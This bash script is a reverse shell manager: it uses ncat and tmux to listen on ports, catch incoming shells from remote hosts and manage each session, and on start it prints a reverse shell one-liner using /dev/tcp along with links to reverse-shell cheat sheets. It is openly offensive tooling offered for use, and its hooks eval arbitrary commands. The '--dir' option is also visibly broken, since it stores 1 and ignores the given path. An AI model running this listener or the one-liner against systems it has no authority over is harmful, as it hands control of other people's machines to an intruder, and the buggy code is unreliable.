#!/bin/bash

declare TOP_PID="$$"
declare -a RSM_ARGUMENTS
declare -A RSM_OPTIONS

function rsm_start {
    local port="$1"
    _check_requirements
    _check_port_valid "$port"
    _check_no_rsm_at "$port"
    _start "$port"
}

function rsm_list {
    _check_requirements
    _check_exist_rsm
    _list_ports
}

function rsm_info {
    local port="$1"
    _check_requirements
    _check_port_valid "$port"
    _check_exist_rsm_at "$port"
    _info "$port"
}

function rsm_info_all {
    _check_requirements
    _check_exist_rsm
    for port in $(_list_ports); do
        _info "$port"
    done
}

function rsm_stop {
    local port="$1"
    _check_requirements
    _check_port_valid "$port"
    _check_exist_rsm_at "$port"
    _stop "$port"
}

function rsm_stop_all {
    _check_requirements
    _check_exist_rsm
    for port in $(_list_ports); do
        _stop "$port"
    done
}

function rsm_attach {
    local port=$1
    _check_requirements
    _check_port_valid "$port"
    _check_exist_rsm_at "$port"
    _attach "$port"
}

function rsm_attach_last {
    _check_requirements
    _check_exist_rsm
    local port
    port="$(_list_ports | tail -1)"
    _check_port_valid "$port"
    _check_exist_rsm_at "$port"
    _attach "$port"
}

function rsm_clean {
    local port="$1"
    _check_requirements
    _check_port_valid "$port"
    _check_exist_rsm_at "$port"
    _clean "$port"
}

function rsm_clean_all {
    _check_requirements
    _check_exist_rsm
    for port in $(_list_ports); do
        _clean "$port"
    done
}

function rsm_help {
    echo "Usage: COMMAND [OPTIONS]
Commands:
    rsm PORT            Start a reverse shell listener on PORT
    rsm d[etached] PORT Start a detached reverse shell listener on PORT
    rsm l[ist]          List active rsm listeners
    rsm i[nfo] PORT     Show details of listener on PORT
    rsm i[nfo]          Show details of all rsm listeners
    rsm s[top] PORT     Stop a rsm listener on PORT
    rsm s[top]          Stop all rsm listeners
    rsm a[ttach] PORT   Attach to a rsm session listening on PORT
    rsm a[ttach]        Attach to the last rsm session
    rsm c[lean] PORT    Clean sockets for PORT
    rsm c[lean]         Clean all sockets
    rsm h[elp]          Show this help message
Options:
    -d, --dir DIR       Where the rsm sockets be stored (default: /tmp/.rsm)
    -n, --max-conn N    Maximum number of connections (default: 128)
    -r, --max-recv N    Maximum receiving MB (default: 0, unlimited)
    -c, --hook CMD      Command to eval when a client connects
    -w, --with CMD      Command to eval when rsm starts
    --ncat-flags FLAGS  Additional command line flags for ncat
    --tmux-flags FLAGS  Additional command line flags for tmux
    -h, --help          Show this help message
"
}

function check_command_exists {
    local command="$1"
    if ! hash "$command" >&/dev/null; then
        echo "error: command '$command' does not exist" >&2
        exit 1
    fi
}

function check_option_not_duplicate {
    local option="$1"
    local key="$2"
    if [[ -v RSM_OPTIONS["$key"] ]]; then
        echo "error: duplicate option $option" >&2
        exit 1
    fi
}

function check_command_requires_argument {
    local command="$1"
    local argc="$2"
    if (( argc == 0 )); then
        echo "error: command $command requires an argument" >&2
        exit 1
    fi
}

function check_command_argument_number {
    local command="$1"
    local argc="$2"
    shift 2
    for n in "$@"; do
        if [[ $argc == "$n" ]]; then
            return
        fi
    done
    echo "error: wrong number of argument for command $command" >&2
    exit 1
}

function check_command_is_defined {
    if [[ ${#RSM_COMMAND[@]} != 0 ]]; then
        echo "error: duplicate commands" >&2
        exit 1
    fi
}

function check_option_requires_value {
    local option="$1"
    local argc="$2"
    if (( argc == 0 )); then
        echo "error: option $option requires a value" >&2
        exit 1
    fi
}

function set_option {
    local option="$1"
    local key="$2"
    local value="$3"
    check_option_not_duplicate "$option" "$key"
    RSM_OPTIONS["$key"]="$value"
}

#===================================================================================

check_command_exists ncat
check_command_exists tmux

_error() {
    ( >&2 echo "error: $1" ); $2
    kill -s TERM $TOP_PID
}

trap 'exit' TERM

_start() {
    local port="$1"
    local dir="$RSM_DIR/$port"
    local session="rsm-$port"
    mkdir -p "$dir"
    RSM_WITH="$RSM_WITH" \
    RSM_HOOK="$RSM_HOOK" \
        tmux -S "$RSM_TMUX_SOCK" new -s "$session" -n listener $RSM_TMUX_FLAGS "
eval \$RSM_WITH &
echo 'info: RSM will be listening on port $port'
echo 'info: the simplest reverse shell command:'
echo '  $' 'bash -c \"bash -i >& /dev/tcp/\$HOST/\$PORT 0<&1\"'
echo 'info: reverse shell cheatsheets:'
echo '  * https://highon.coffee/blog/reverse-shell-cheat-sheet/'
echo '  * https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet'
echo '  * https://oscp.infosecsanyam.in/shells/reverse-shell-cheat-sheet'
echo
ncat $RSM_NCAT_FLAGS -v -k -l $port -c '
    IP=\$NCAT_REMOTE_ADDR
    PORT=\$NCAT_REMOTE_PORT
    REMOTE_ADDR=\$IP:\$PORT
    eval \$RSM_HOOK
    NAME=client-\${REMOTE_ADDR}-\$(date +%Y.%m.%d-%H:%M:%S)
    tmux -S $RSM_TMUX_SOCK new-window -t $session -n \$REMOTE_ADDR \"
        echo \$(date), connection from: \$REMOTE_ADDR
        echo ________________________________________________________________
        until [[ -S $dir/\$NAME ]]; do sleep 0.1; done
        ncat -U $dir/\$NAME | $RSM_CAT
    \"
    ncat -lU $dir/\$NAME
    rm -f $dir/\$NAME
    ' || {
        echo
        echo 'warning: window will be closed after 5 seconds'
        echo
        for i in 5 4 3 2 1; do
            echo -n \$i
            sleep 1
        done
    }
rm -rf $dir
"
}

_stop() {
    local port="$1"
    local session="rsm-$port"
    _clean "$port"
    echo "Killing $session"
    tmux -S "$RSM_TMUX_SOCK" kill-session -t "$session"
    rm -rf "${RSM_DIR:?}/$port"
}

_clean() {
    local port=$1
    local session=rsm-$port
    local windows
    windows="$(tmux -S "$RSM_TMUX_SOCK" list-windows -t "$session" \
        | grep -v listener \
        | cut -d: -f1)"
    for i in $windows; do
        echo "Killing $session:$i"
        tmux -S "$RSM_TMUX_SOCK" kill-window -t "$session:$i"
    done
    rm -f "$RSM_DIR"/"$port"/*
}

_attach() {
    local port=$1
    tmux -S "$RSM_TMUX_SOCK" attach -t "rsm-$port"
}

_list_sessions() {
    tmux -S "$RSM_TMUX_SOCK" ls 2>/dev/null | grep -E '^rsm-[0-9]+:' | sed 's/:.*//g'
}

_list_ports() {
    _list_sessions | sed 's/^rsm-//g'
}

_info() {
    local port=$1
    local dir=$RSM_DIR/$port
    echo "$port"
    find "$dir" -maxdepth 1 -type d -printf "- %f\n"
}

_check_port_valid() {
    [[ $1 ]] \
        || _error "port cannot be empty"
    [[ $1 =~ ^-?[0-9]+$ ]] \
        || _error "port must be a number"
    [[ $((0 < $1 && $1 < 65536)) = 1 ]] \
        || _error "port is out of range"
}

_check_exist_rsm() {
    [[ $(_list_sessions) ]] \
        || _error "nothing listening"
}

_check_exist_rsm_at() {
    tmux -S "$RSM_TMUX_SOCK" ls 2>/dev/null | grep -qE "^rsm-$port:" \
        || _error "nothing listening on port $1"
}

_check_no_rsm_at() {
    tmux -S "$RSM_TMUX_SOCK" ls 2>/dev/null | grep -qE "^rsm-$port:" \
        && _error "already listening on port $1"
}

_check_exist_command() {
    command -v "$1" >/dev/null 2>&1 \
        || _error "'$1' doesn't exist."
}

_check_requirements() {
    _check_exist_command tmux
    _check_exist_command ncat
}

#===================================================================================

while (( $# > 0 )); do
    arg="$1"
    shift
    case "$arg" in
        -d|--dir)
            check_option_requires_value "$arg" "$#"
            set_option "$arg" 'dir' 1
            ;;
        -r|--max-recv)
            check_option_requires_value "$arg" "$#"
            set_option "$arg" 'max_recv' "$1"
            shift
            ;;
        -n|--max-conn)
            check_option_requires_value "$arg" "$#"
            set_option "$arg" 'max_conn' "$1"
            shift
            ;;
        -c|--hook)
            check_option_requires_value "$arg" "$#"
            set_option "$arg" 'hook' "$1"
            shift
            ;;
        -w|--with)
            check_option_requires_value "$arg" "$#"
            set_option "$arg" 'with' "$1"
            shift
            ;;
        --ncat-flags)
            check_option_requires_value "$arg" "$#"
            set_option "$arg" "ncat_flags" "$1"
            shift
            ;;
        --tmux-flags)
            check_option_requires_value "$arg" "$#"
            set_option "$arg" "tmux_flags" "$1"
            shift
            ;;
        -h|--help)
            set_option "$arg" 'help' 1
            ;;
        -*)
            echo "error: unknown option $arg" >&2
            exit 1
            ;;
        *)
            RSM_ARGUMENTS+=("$arg")
            ;;
    esac
done

if [[ -v RSM_OPTIONS["help"] ]]; then
    rsm_help
    exit 0
fi

[[ -v RSM_OPTIONS["dir"] ]] \
    && RSM_DIR="${RSM_OPTIONS["dir"]}" \
    || RSM_DIR="${RSM_DIR:-/tmp/.rsm}"
[[ -v RSM_OPTIONS["max_conn"] ]] \
    && RSM_MAX_CONN="${RSM_OPTIONS["max_conn"]}" \
    || RSM_MAX_CONN="${RSM_MAX_CONN:-128}"
[[ -v RSM_OPTIONS["max_recv"] ]] \
    && RSM_MAX_RECV="${RSM_OPTIONS["max_recv"]}" \
    || RSM_MAX_RECV="${RSM_MAX_RECV:-0}"
[[ -v RSM_OPTIONS["with"] ]] \
    && RSM_WITH="${RSM_OPTIONS["with"]}" \
    || RSM_WITH="${RSM_WITH:-:}"
[[ -v RSM_OPTIONS["hook"] ]] \
    && RSM_HOOK="${RSM_OPTIONS["hook"]}" \
    || RSM_HOOK="${RSM_HOOK:-:}"
[[ -v RSM_OPTIONS["ncat_flags"] ]] \
    && RSM_NCAT_FLAGS="${RSM_OPTIONS["ncat_flags"]}" \
    || RSM_NCAT_FLAGS="${RSM_NCAT_FLAGS:-}"
[[ -v RSM_OPTIONS["tmux_flags"] ]] \
    && RSM_TMUX_FLAGS="${RSM_OPTIONS["tmux_flags"]}" \
    || RSM_TMUX_FLAGS="${RSM_TMUX_FLAGS:-}"

[[ $RSM_MAX_CONN -gt 0 && $RSM_NCAT_FLAGS != *'-m'* ]] \
    && RSM_NCAT_FLAGS="$RSM_NCAT_FLAGS -m $RSM_MAX_CONN"
[[ $RSM_MAX_RECV -gt 0 ]] \
    && RSM_CAT="head -c $(( RSM_MAX_RECV * 1024 * 1024 ))" \
    || RSM_CAT='cat'

RSM_TMUX_SOCK="$RSM_DIR/tmux.sock"

mkdir -p "$RSM_DIR"

[[ ${#RSM_ARGUMENTS[@]} == 0 ]] && _error "requires an argument" rsm_help

case "${RSM_ARGUMENTS[0]}" in
    detached|de|d)
        check_command_argument_number "${RSM_ARGUMENTS[0]}" "${#RSM_ARGUMENTS[@]}" 2
        [[ $RSM_TMUX_FLAGS != *'-d'* ]] && RSM_TMUX_FLAGS="$RSM_TMUX_FLAGS -d"
        rsm_start "${RSM_ARGUMENTS[@]:1}"
        ;;
    stop|st|s)
        check_command_argument_number "${RSM_ARGUMENTS[0]}" "${#RSM_ARGUMENTS[@]}" 1 2
        if [[ -z ${RSM_ARGUMENTS[1]} ]]; then
            rsm_stop_all
        else
            rsm_stop "${RSM_ARGUMENTS[@]:1}"
        fi
        ;;
    clean|cl|c)
        check_command_argument_number "${RSM_ARGUMENTS[0]}" "${#RSM_ARGUMENTS[@]}" 1 2
        if [[ -z ${RSM_ARGUMENTS[1]} ]]; then
            rsm_clean_all
        else
            rsm_clean "${RSM_ARGUMENTS[@]:1}"
        fi
        ;;
    attach|at|a)
        check_command_argument_number "${RSM_ARGUMENTS[0]}" "${#RSM_ARGUMENTS[@]}" 1 2
        if [[ -z ${RSM_ARGUMENTS[1]} ]]; then
            rsm_attach_last
        else
            rsm_attach "${RSM_ARGUMENTS[@]:1}"
        fi
        ;;
    list|ls|l)
        check_command_argument_number "${RSM_ARGUMENTS[0]}" "${#RSM_ARGUMENTS[@]}" 1
        rsm_list
        ;;
    info|i)
        check_command_argument_number "${RSM_ARGUMENTS[0]}" "${#RSM_ARGUMENTS[@]}" 1 2
        if [[ ${#RSM_ARGUMENTS[@]} == 1 ]]; then
            rsm_info_all
        else
            rsm_info "${RSM_ARGUMENTS[@]:1}"
        fi
        ;;
    help|h)
        check_command_argument_number "${RSM_ARGUMENTS[0]}" "${#RSM_ARGUMENTS[@]}" 1
        rsm_help
        ;;
    *)
        check_command_argument_number "$(basename "$0")" "${#RSM_ARGUMENTS[@]}" 1
        rsm_start "${RSM_ARGUMENTS[@]}"
        ;;
esac
